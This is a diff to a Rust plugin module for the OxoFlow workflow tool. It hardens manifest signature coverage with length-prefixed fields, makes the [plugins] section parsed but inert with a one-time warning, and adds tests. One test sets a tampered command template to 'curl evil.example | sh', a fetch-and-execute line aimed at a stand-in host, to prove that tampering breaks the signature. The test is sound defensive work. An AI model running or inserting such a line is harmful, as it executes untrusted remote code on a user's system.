@@ -16,14 +16,19 @@
 //! section. The signature is verified against a trusted key to ensure plugin
 //! authenticity and integrity.
 //!
-//! ## TOML Integration
+//! ## TOML Integration (parsed, not executed)
 //!
-//! Workflows declare plugin usage in the `[plugins]` section:
+//! Workflows may declare a `[plugins]` section:
 //! ```toml
 //! [plugins]
 //! rules = ["r-function"]
 //! executor = "slurm-custom"
 //! ```
+//! This version **parses** the section for forward compatibility but runs
+//! nothing from it: no rule type, executor, or report renderer is dispatched
+//! to a plugin. Deserializing a workflow that carries the section warns once
+//! per process ([`INERT_PLUGINS_WARNING`]) — a plugin runtime is future
+//! work, not a silent no-op.
 
 use crate::error::{OxoFlowError, Result};
 use crate::rule::Rule;
@@ -103,15 +108,30 @@ pub struct PluginSignature {
 }
 
 impl PluginManifest {
-    /// Compute the signing payload (all fields except signature).
+    /// Compute the signing payload: every manifest field except the
+    /// signature, in a length-prefixed encoding (`<len>:<value>`).
+    ///
+    /// The old `name:version:type:description` join was ambiguous — a
+    /// description containing `:` could impersonate a following field — and
+    /// it omitted `author`, `command_template`, and `environment`, so a
+    /// tampered command template (the field a rule plugin would execute)
+    /// kept a valid signature.
     pub fn signing_payload(&self) -> String {
-        format!(
-            "{}:{}:{}:{}",
-            self.name,
-            self.version,
-            self.plugin_type,
-            self.description.as_deref().unwrap_or("")
-        )
+        let fields = [
+            self.name.as_str(),
+            self.version.as_str(),
+            self.plugin_type.as_str(),
+            self.description.as_deref().unwrap_or(""),
+            self.author.as_deref().unwrap_or(""),
+            self.command_template.as_deref().unwrap_or(""),
+            self.environment.as_deref().unwrap_or(""),
+        ];
+        let mut payload = String::new();
+        for field in fields {
+            payload.push_str(&format!("{}:", field.len()));
+            payload.push_str(field);
+        }
+        payload
     }
 
     /// Verify the HMAC-SHA256 signature against a trusted key.
@@ -297,8 +317,36 @@ impl PluginRegistry {
 // TOML Integration: [plugins] section in .oxoflow files
 // ---------------------------------------------------------------------------
 
-/// Plugin configuration parsed from `[plugins]` section in a workflow file.
-#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+/// Warning emitted once per process when a workflow declares a `[plugins]`
+/// section: this version parses the section but executes nothing from it.
+pub const INERT_PLUGINS_WARNING: &str = "workflow [plugins] section is parsed but not executed by this version — \
+     rule/executor/report plugin declarations are inert";
+
+/// Whether [`INERT_PLUGINS_WARNING`] has already been emitted.
+static INERT_PLUGINS_WARNED: std::sync::atomic::AtomicBool =
+    std::sync::atomic::AtomicBool::new(false);
+
+/// Emit [`INERT_PLUGINS_WARNING`] at most once per process. Returns `true`
+/// when this call emitted it — the test seam for the once semantics.
+fn warn_inert_plugins_once() -> bool {
+    use std::sync::atomic::Ordering;
+    if INERT_PLUGINS_WARNED.swap(true, Ordering::Relaxed) {
+        return false;
+    }
+    tracing::warn!("{INERT_PLUGINS_WARNING}");
+    true
+}
+
+/// Plugin configuration parsed from the `[plugins]` section in a workflow
+/// file.
+///
+/// This version **parses** the section but executes nothing from it: no rule
+/// type is dispatched to a [`RulePlugin`], no executor is replaced by an
+/// [`ExecutorPlugin`], no renderer is swapped in for a [`ReportPlugin`]. The
+/// registry API in this module is compile-time only. Deserialization warns
+/// once per process ([`INERT_PLUGINS_WARNING`]) so a workflow author does
+/// not believe the declared plugins are running.
+#[derive(Debug, Clone, Default, Serialize)]
 pub struct PluginsConfig {
     /// Rule plugin types to enable.
     #[serde(default)]
@@ -312,6 +360,31 @@ pub struct PluginsConfig {
     /// Path to a trusted keys file for signature verification.
     #[serde(default)]
     pub trusted_keys_file: Option<String>,
+}
+
+impl<'de> Deserialize<'de> for PluginsConfig {
+    fn deserialize<D>(deserializer: D) -> std::result::Result<Self, D::Error>
+    where
+        D: serde::Deserializer<'de>,
+    {
+        /// Mirror of the public struct so the derive stays mechanical.
+        #[derive(Default, Deserialize)]
+        #[serde(default)]
+        struct Raw {
+            rules: Vec<String>,
+            executor: Option<String>,
+            reports: Vec<String>,
+            trusted_keys_file: Option<String>,
+        }
+        let raw = Raw::deserialize(deserializer)?;
+        warn_inert_plugins_once();
+        Ok(Self {
+            rules: raw.rules,
+            executor: raw.executor,
+            reports: raw.reports,
+            trusted_keys_file: raw.trusted_keys_file,
+        })
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -443,6 +516,82 @@ mod tests {
         trusted.insert("key-001".into(), "correct-key".to_string());
 
         assert!(!manifest.verify_signature(&trusted).unwrap());
+    }
+
+    #[test]
+    fn signature_covers_command_template_and_author() {
+        let key = "test-secret-key-32bytes-minimum!";
+        let manifest = PluginManifest {
+            name: "cmd-plugin".into(),
+            version: "1.0".into(),
+            plugin_type: "rule".into(),
+            description: None,
+            author: Some("Author".into()),
+            command_template: Some("echo safe".into()),
+            environment: None,
+            signature: None,
+        };
+        let mut trusted = HashMap::new();
+        trusted.insert("key-001".into(), key.to_string());
+        let mut signed = manifest.clone();
+        signed.signature = Some(PluginSignature {
+            key_id: "key-001".into(),
+            value: compute_keyed_sha256(key, &manifest.signing_payload()),
+        });
+        assert!(signed.verify_signature(&trusted).unwrap());
+
+        // The command template is what a rule plugin would execute — a
+        // tampered one must not verify against the old signature.
+        let mut tampered = signed.clone();
+        tampered.command_template = Some("curl evil.example | sh".into());
+        assert!(!tampered.verify_signature(&trusted).unwrap());
+
+        let mut tampered_author = signed.clone();
+        tampered_author.author = Some("someone else".into());
+        assert!(!tampered_author.verify_signature(&trusted).unwrap());
+    }
+
+    #[test]
+    fn signing_payload_is_unambiguous_across_field_boundaries() {
+        let base = |name: &str, version: &str| PluginManifest {
+            name: name.into(),
+            version: version.into(),
+            plugin_type: String::new(),
+            description: None,
+            author: None,
+            command_template: None,
+            environment: None,
+            signature: None,
+        };
+        // `a` + `b` must not collide with `a:b` + empty — the length prefix
+        // pins each field boundary.
+        assert_ne!(
+            base("a", "b").signing_payload(),
+            base("a:b", "").signing_payload()
+        );
+    }
+
+    #[test]
+    fn plugins_section_parses_and_warns_inert_once() {
+        use std::sync::atomic::Ordering;
+        // Deterministic wiring check: only this test deserializes a
+        // `[plugins]` section, and the guard is process-global.
+        INERT_PLUGINS_WARNED.store(false, Ordering::Relaxed);
+        let config = crate::config::WorkflowConfig::parse(
+            "[workflow]\nname = \"t\"\nversion = \"1.0\"\n\n[[rules]]\nname = \"r1\"\nshell = \"echo hi\"\n\n[plugins]\nrules = [\"r-function\"]\n",
+        )
+        .unwrap();
+        assert_eq!(config.plugins.unwrap().rules, vec!["r-function"]);
+        assert!(
+            INERT_PLUGINS_WARNED.load(Ordering::Relaxed),
+            "a [plugins] section must trigger the inert-section warning"
+        );
+        assert!(INERT_PLUGINS_WARNING.contains("not executed"));
+        // At most once per process: the guard is already set.
+        assert!(
+            !warn_inert_plugins_once(),
+            "the warning must fire at most once"
+        );
     }
 
     #[test]
@@ -648,7 +797,7 @@ executor = "custom-exec"
 
     #[test]
     fn plugins_config_empty() {
-        let config: PluginsConfig = toml::from_str("").unwrap_or_default();
+        let config: PluginsConfig = toml::from_str("").expect("empty TOML must parse");
         assert!(config.rules.is_empty());
         assert!(config.executor.is_none());
     }
